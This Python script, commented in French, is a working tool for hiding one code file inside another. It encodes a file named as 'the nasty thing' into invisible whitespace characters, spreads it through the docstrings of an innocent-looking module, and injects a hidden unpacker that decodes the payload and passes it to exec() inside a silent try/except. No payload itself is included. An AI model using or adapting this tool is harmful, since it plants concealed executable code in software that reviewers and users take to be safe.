import codecs

# 32 : espace de base
# 128
# 148 : Annulation du caractède précédant
# 160 : espace insécable
# 173 : trait d'union conditionnel

####### CONFIGURATION START #############
CODE_TO_HIDE_PATH = "le_mechant_truc.py"
SAFE_CODE_PATH = "../packagev3.py"
OUTPUT_CODE_PATH = "../team_up.py"


# TOTAL_OBFS_KEYS = [i for i in range(0x80, 0x85)]
TOTAL_OBFS_KEYS = [32, 160, 0x34f]
SIMPLE_OBFS_KEYS = TOTAL_OBFS_KEYS
INDICATOR_KEY = 0xad  # Should not be in TOTAL... 
NBR_BYTES = 5

# TODO : set une_fonction to the first function
visible_unziping_code = """graph = total.split(vector)[0].replace(chr(32), '0').replace(chr(160), '1').replace(chr(0x34f), '2')
exec(''.join(chr(int(graph[i:i+{nbr_bytes}], {base})) for i in range(0, len(graph), {nbr_bytes})))""".format(nbr_bytes=NBR_BYTES, base=len(SIMPLE_OBFS_KEYS))

unziping_indice = "# <>"
hidden_unziping_code = """import codecs as c
oc=''
for func in [l.split('(')[0][4:] for l in c.open(__file__,"r","utf-8") if l.startswith('def')]:
    f=[l for l in eval(func + '.__doc__').split(chr({indicator_key}))]
    oc+=''.join(f[i] for i in range(1,len(f),2))
for i,e in enumerate({all_keys}): oc = oc.replace(chr(e),str(i))
try:
    exec(''.join(chr(int(oc[i:i+{nbr_bytes}],{base})) for i in range(0,len(oc),{nbr_bytes})))
except:
    pass
""".format(indicator_key=INDICATOR_KEY, all_keys=TOTAL_OBFS_KEYS, nbr_bytes=NBR_BYTES, base=len(TOTAL_OBFS_KEYS))
######### CONFIGURATION END ############

def baseN(num, b, numerals="0123456789abcdefghijklmnopqrstuvwxyz"):
    """Convert to base"""
    return ((num == 0) and numerals[0]) or (baseN(num // b, b, numerals).lstrip(numerals[0]) + numerals[num % b])

dangerous_file = codecs.open(CODE_TO_HIDE_PATH, "r", "utf-8-sig")

# I. Obfuscate the invisible unzipping code in space
unziping_code_binary_gen = (baseN(ord(i), len(SIMPLE_OBFS_KEYS)) for i in hidden_unziping_code)
unziping_code_binary = ''.join('0'*(NBR_BYTES - len(x)) + x for x in unziping_code_binary_gen)  # Normalize to 8 bits
unziping_code_spaces = ''.join(chr(TOTAL_OBFS_KEYS[int(x, base=len(TOTAL_OBFS_KEYS))]) for x in unziping_code_binary)  # convert to spaces

# II. Obfuscate the dangerous code
obfucated_code_gen = (baseN(ord(i), len(TOTAL_OBFS_KEYS)) for i in dangerous_file.read())  # convert to base N
obfucated_code_N_base = ''.join('0'*(NBR_BYTES - len(x)) + x for x in obfucated_code_gen)  # Normalize to NBR_BYTES bytes
obfucated_code = ''.join(chr(TOTAL_OBFS_KEYS[int(x, base=len(TOTAL_OBFS_KEYS))]) for x in obfucated_code_N_base)  # convert to spaces
safe_file = codecs.open(SAFE_CODE_PATH, "r", "utf-8-sig")

# Add the unzipping code on the first function
docstring_cut = safe_file.read().split('"""')
docstring_cut[1] = unziping_code_spaces + docstring_cut[1]

# Add the rest on the other lines
every_line = [l for i in range(1, len(docstring_cut), 2) for l in docstring_cut[i].split('\n')]
size_batch = len(obfucated_code) // (len(every_line) - 2 - len(docstring_cut) // 2)  # -1 because we dont want the first

k = 0
for i in range(1, len(docstring_cut), 2):
    line_cut = docstring_cut[i].split('\n')
    starting_line = 1 if i == 1 else 0
    for j in range(starting_line, len(line_cut) - 1):
        line_cut[j] = line_cut[j] + chr(INDICATOR_KEY) + obfucated_code[size_batch * (k): size_batch * (k+1)] + chr(INDICATOR_KEY)
        k += 1
    docstring_cut[i] = '\n'.join(line_cut)

regonisied = '"""'.join(docstring_cut)

regonisied = regonisied.replace(unziping_indice, visible_unziping_code)
final_file = codecs.open(OUTPUT_CODE_PATH, "w", "utf-8")
final_file.write(regonisied)

final_file.close()
safe_file.close()
dangerous_file.close()